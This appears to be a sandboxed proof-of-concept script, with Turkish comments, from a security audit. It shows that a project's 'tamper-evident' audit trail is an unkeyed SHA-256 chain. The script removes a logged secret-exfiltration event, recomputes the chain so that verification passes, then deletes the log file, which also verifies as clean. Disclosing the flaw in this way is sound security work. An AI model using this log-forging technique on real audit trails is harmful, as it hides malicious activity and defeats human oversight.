#!/usr/bin/env python3
"""PoC 02: Audit trail "tamper-evident" DEGIL - gecmis tamamen yeniden yazilabiliyor/silinebiliyor.

Zafiyet: CryptographicAuditTrail zinciri imzasiz/anahtarsiz duz SHA-256 zinciridir.
Saldirgan tum zinciri yeniden hesaplayip yazabilir; dosya silinirse verify_integrity
(True, "Audit log is empty") dondurur.
"""
import os
import sys
import json
import shutil
import hashlib

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc02"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

from military_audit import CryptographicAuditTrail

AUDIT_FILE = "audit_trail.json"


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


def rechain(blocks):
    prev = CryptographicAuditTrail.GENESIS_HASH
    for i, b in enumerate(blocks):
        b["index"] = i
        b["prev_hash"] = prev
        raw = f"{i}|{b['timestamp']}|{b['event_type']}|{b['actor']}|{b['details']}|{b['severity']}|{prev}"
        b["hash"] = hashlib.sha256(raw.encode("utf-8")).hexdigest()
        prev = b["hash"]
    return blocks


banner("PoC 02: Audit trail gecmisinin yeniden yazilmasi ve silinmesi")

CryptographicAuditTrail.record_event("VAULT_UNLOCK", "victim", "Kasa acildi.", "INFO")
CryptographicAuditTrail.record_event("SECRET_EXFIL", "attacker", "24 kelimelik seed disari sizdirildi!", "CRITICAL")
CryptographicAuditTrail.record_event("USUAL_OP", "victim", "Portfoy guncellendi.", "INFO")

ok, msg, count = CryptographicAuditTrail.verify_integrity()
print(f"[+] Baslangic dogrulamasi: ok={ok} | {msg}")
print("[+] Zincir: " + " -> ".join(e["event_type"] for e in CryptographicAuditTrail._read_chain()))

with open(AUDIT_FILE, encoding="utf-8") as f:
    chain = json.load(f)

forged = [b for b in chain if b["event_type"] != "SECRET_EXFIL"]
rechain(forged)
with open(AUDIT_FILE, "w", encoding="utf-8") as f:
    json.dump(forged, f, indent=2, ensure_ascii=False)

ok2, msg2, count2 = CryptographicAuditTrail.verify_integrity()
print(f"\n[!] Saldırgan SECRET_EXFIL kaydini sildi ve sonraki bloklarin hash'lerini yeniden hesapladi.")
print(f"[!] verify_integrity() sonucu: ok={ok2} | {msg2}")
print("[!] Yeni zincir: " + " -> ".join(e["event_type"] for e in CryptographicAuditTrail._read_chain()))

os.remove(AUDIT_FILE)
ok3, msg3, count3 = CryptographicAuditTrail.verify_integrity()
print(f"\n[!] Saldırgan audit dosyasini tamamen sildi.")
print(f"[!] verify_integrity() sonucu: ok={ok3} | {msg3} | blok={count3}")

print("\n" + "-" * 72)
print("KANIT: Zincirde HMAC/imza/trusted anchor yok. Gecmis kanit ortadan kaldirilabiliyor")
print("       ve dogrulama 'TEMIZ' sonuc veriyor. Dosya silmek de 'temiz' sayiliyor.")
print("-" * 72)
